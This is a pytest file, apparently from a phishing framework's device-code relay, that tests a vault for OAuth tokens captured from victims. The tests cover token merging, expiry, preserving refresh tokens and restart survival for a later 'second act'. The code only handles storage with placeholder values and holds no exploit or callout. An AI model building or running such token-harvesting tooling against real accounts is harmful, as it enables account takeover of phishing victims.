"""P1.4: a captured token must survive the process that captured it.

The device-code relay was shipped and live-verified while its tokens lived only in
memory and on the console - the access token, the refresh token and the granted scopes
died with the process, so the second act had nothing to run on. These tests cover the
vault block from every angle a real run touches it: the merge rules, the lifetime, the
readers, hostile input, a duplicate approval, and - the point of the whole change - a
reopen of the database in a fresh process.
"""
import json
import os
import sqlite3
import sys
import time

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

from core import capture as cap  # noqa: E402
from core import session as S  # noqa: E402

pytestmark = pytest.mark.unit

TOKENS = {"access_token": "AT-1", "refresh_token": "RT-1", "id_token": "ID-1",
          "token_type": "Bearer", "expires_in": 3600, "scope": "mail.read files.write"}


def _rec():
    return S.new_record("sid-a", phishlet="t", campaign="c")


# ================================================================ the writer ====
class TestAddOauth:

    def test_a_new_record_has_an_empty_oauth_block(self):
        assert _rec()["oauth"] == {}

    def test_it_keeps_what_a_later_action_needs(self):
        rec = _rec()
        assert S.add_oauth(rec, TOKENS, provider="microsoft", client_id="cid") == 1
        b = rec["oauth"]
        assert b["access_token"] == "AT-1" and b["refresh_token"] == "RT-1"
        assert b["id_token"] == "ID-1" and b["token_type"] == "Bearer"
        assert b["provider"] == "microsoft" and b["client_id"] == "cid"
        assert b["source"] == "devicecode"
        # the granted scope arrives as one string in the token answer
        assert b["scopes"] == ["mail.read", "files.write"]
        assert b["expires_at"] > time.time()
        assert b["captured_at"] and b["updated"]

    def test_it_records_the_timeline_event_and_raises_the_state(self):
        rec = _rec()
        S.add_oauth(rec, TOKENS, provider="google")
        assert rec["state"] == "session"
        assert rec["timeline"][-1]["event"] == "oauth"
        assert "google" in rec["timeline"][-1]["detail"]

    def test_an_access_only_answer_is_stored(self):
        rec = _rec()
        assert S.add_oauth(rec, {"access_token": "AT"}) == 1
        assert S.oauth_summary(rec)["has_refresh"] is False

    def test_a_later_merge_does_not_lose_the_refresh_token(self):
        rec = _rec()
        S.add_oauth(rec, TOKENS, provider="microsoft", client_id="cid")
        S.add_oauth(rec, {"access_token": "AT-2", "expires_in": 60}, source="refresh")
        b = rec["oauth"]
        assert b["access_token"] == "AT-2" and b["refresh_token"] == "RT-1"
        assert b["provider"] == "microsoft" and b["client_id"] == "cid"
        assert b["source"] == "refresh"
        assert b["scopes"] == ["mail.read", "files.write"]      # not wiped

    def test_unknown_fields_are_kept_not_dropped(self):
        rec = _rec()
        S.add_oauth(rec, {**TOKENS, "foci": "1", "client_info": "xyz"})
        assert rec["oauth"]["extra"] == {"foci": "1", "client_info": "xyz"}

    def test_explicit_scopes_win_over_the_answer(self):
        rec = _rec()
        S.add_oauth(rec, TOKENS, scopes=["openid"])
        assert rec["oauth"]["scopes"] == ["openid"]

    @pytest.mark.parametrize("junk", [None, [], "a string", 5, {}, {"expires_in": 60},
                                      {"nothing": "useful"}])
    def test_junk_never_creates_a_block(self, junk):
        rec = _rec()
        assert S.add_oauth(rec, junk) == 0
        assert rec["oauth"] == {}

    def test_a_non_numeric_expiry_does_not_raise(self):
        rec = _rec()
        S.add_oauth(rec, {"access_token": "AT", "expires_in": "not-a-number"})
        assert "expires_at" not in rec["oauth"]
        assert S.oauth_valid(rec) is True          # no expiry recorded, still usable

    def test_a_negative_expiry_is_treated_as_expired(self):
        rec = _rec()
        S.add_oauth(rec, {"access_token": "AT", "expires_in": -10})
        assert S.oauth_summary(rec)["expired"] is True


# ================================================================ the readers ====
class TestTheReaders:

    def test_valid_reflects_the_lifetime(self):
        rec = _rec()
        S.add_oauth(rec, TOKENS)
        assert S.oauth_valid(rec) is True
        assert S.oauth_valid(rec, now=time.time() + 3601) is False
        # exactly at the boundary the token is no longer usable
        exp = rec["oauth"]["expires_at"]
        assert S.oauth_valid(rec, now=exp) is False
        assert S.oauth_valid(rec, now=exp - 1) is True

    def test_an_empty_record_is_not_valid(self):
        assert S.oauth_valid(_rec()) is False
        assert S.oauth_valid(None) is False
        assert S.oauth_summary(_rec()) == {}

    def test_a_refresh_only_block_is_valid(self):
        rec = _rec()
        S.add_oauth(rec, {"refresh_token": "RT"})
        assert S.oauth_valid(rec) is True

    def test_the_summary_never_carries_a_secret(self):
        rec = _rec()
        S.add_oauth(rec, TOKENS, provider="microsoft", client_id="cid")
        blob = json.dumps(S.oauth_summary(rec))
        for secret in ("AT-1", "RT-1", "ID-1", "access_token", "refresh_token"):
            assert secret not in blob, secret
        summ = S.oauth_summary(rec)
        assert summ["has_access"] and summ["has_refresh"] and summ["valid"]
        assert summ["expires_in"] > 3500 and summ["expired"] is False
        assert summ["provider"] == "microsoft" and summ["client_id"] == "cid"


# =========================================================== restart survival ====
class TestItSurvivesARestart:
    """The whole point: a fresh process must find the token and everything it needs."""

    def _vault_path(self, d):
        return os.path.join(d, "vault.db")

    def test_a_saved_token_is_readable_after_a_reopen(self, tmp_path):
        path = self._vault_path(str(tmp_path))
        db = cap.CaptureDB(path)
        rec = S.new_record("dc-tag1", phishlet="devicecode:microsoft", campaign="c")
        S.add_oauth(rec, TOKENS, provider="microsoft", client_id="cid",
                    tenant="contoso", issuer="https://login.example/v2.0")
        db.session_save(rec)
        db.close()

        # a fresh object over the same file is what a restart looks like
        db2 = cap.CaptureDB(path)
        back = db2.session_get("dc-tag1")
        db2.close()
        assert back is not None, "the session record did not survive"
        assert back["oauth"]["access_token"] == "AT-1"
        assert back["oauth"]["refresh_token"] == "RT-1"
        assert back["oauth"]["scopes"] == ["mail.read", "files.write"]
        assert back["oauth"]["tenant"] == "contoso"
        assert back["oauth"]["issuer"] == "https://login.example/v2.0"
        assert S.oauth_valid(back) is True
        assert S.oauth_summary(back)["has_refresh"] is True

    def test_a_second_approval_updates_instead_of_duplicating(self, tmp_path):
        path = self._vault_path(str(tmp_path))
        db = cap.CaptureDB(path)
        for i in (1, 2):
            rec = db.session_get("dc-tag2") or S.new_record(
                "dc-tag2", phishlet="devicecode:microsoft")
            S.add_oauth(rec, {"access_token": f"AT-{i}", "refresh_token": f"RT-{i}",
                              "expires_in": 3600}, provider="microsoft")
            db.session_save(rec)
        rows = sqlite3.connect(path).execute(
            "SELECT COUNT(*) FROM sessions WHERE sid='dc-tag2'").fetchone()[0]
        back = db.session_get("dc-tag2")
        db.close()
        assert rows == 1, f"the same tag created {rows} rows"
        assert back["oauth"]["access_token"] == "AT-2"
        assert back["oauth"]["refresh_token"] == "RT-2"


# ======================================================= the flow, end to end ====
class TestTheFlowFeedsTheVault:
    """What the CLI does on approval: the flow's tokens go into the record."""

    def test_a_completed_flow_fills_the_vault_and_can_refresh(self):
        from tests.test_devicecode import IdP
        with IdP(answers=["authorization_pending", "token"]) as idp:
            flow = idp.flow().start()
            assert flow.poll(sleep=lambda s: None, max_wait=10) == "token"
            rec = S.new_record(f"dc-{flow.tag}")
            assert S.add_oauth(rec, flow.tokens, provider=flow.provider,
                               client_id=flow.client_id, tenant=flow.tenant,
                               issuer=flow.issuer) == 1
            summ = S.oauth_summary(rec)
            assert summ["has_refresh"] is True and summ["valid"] is True
            assert summ["provider"] == "custom" and summ["client_id"] == "test-client"
            # and the refreshed token replaces the access token in the same block
            out = flow.refresh()
            S.add_oauth(rec, out, source="refresh")
            assert rec["oauth"]["access_token"] == out["access_token"]
            assert rec["oauth"]["refresh_token"]                      # never dropped
